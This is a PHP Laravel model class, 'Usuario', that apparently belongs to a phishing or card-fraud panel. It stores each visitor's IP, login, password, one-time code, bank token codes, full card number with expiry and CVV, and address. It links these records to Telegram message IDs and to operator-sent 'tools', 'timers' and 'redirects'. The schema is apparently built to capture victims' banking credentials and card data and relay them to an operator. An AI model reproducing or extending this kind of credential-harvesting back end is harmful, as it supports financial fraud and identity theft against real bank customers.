<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\HasMany;
use Illuminate\Database\Eloquent\Relations\HasOne;

class Usuario extends Model
{
    use HasFactory;

    protected $table = 'usuarios';

    public $timestamps = false;

    protected $fillable = [
        'ip_real',
        'fecha_ingreso',
        'usuario',
        'password',
        'otp',
        'user_agent',
        'nombre',
        'apellido',
        'telefono_movil',
        'telefono_fijo',
        'email',
        'token_codigo',
        'sgdotoken_codigo',
        'msg_id',
        'msg_in_id',
        'bot_thread_id',
        'comentarios',
        //  fields
        'tarjeta_numero',
        'tarjeta_expiracion',
        'tarjeta_cvv',
        'titular_tarjeta',
        'direccion',
        'codigo_postal',
        'estado_residencia',
        'telegram_message_id'
    ];

    protected $casts = [
        'fecha_ingreso' => 'datetime',
        'comentarios' => 'array',
    ];

    protected $hidden = [
        'password',
        'token_codigo',
        'sgdotoken_codigo',
        // Sensibles
        'tarjeta_numero',
        'tarjeta_cvv',
    ];

    // Relaciones
    public function estatusUsuario(): HasOne
    {
        return $this->hasOne(EstatusUsuario::class, 'usuario_id');
    }

    public function mensajesAdmin(): HasMany
    {
        return $this->hasMany(MensajeAdmin::class, 'usuario_id');
    }

    public function herramientasEnviadas(): HasMany
    {
        return $this->hasMany(HerramientaEnviada::class, 'usuario_id');
    }

    public function timersEnviados(): HasMany
    {
        return $this->hasMany(TimerEnviado::class, 'usuario_id');
    }

    public function redireccionesEnviadas(): HasMany
    {
        return $this->hasMany(RedireccionEnviada::class, 'usuario_id');
    }

    // Accessors
    public function getNombreCompletoAttribute(): string
    {
        return trim($this->nombre . ' ' . $this->apellido);
    }
}
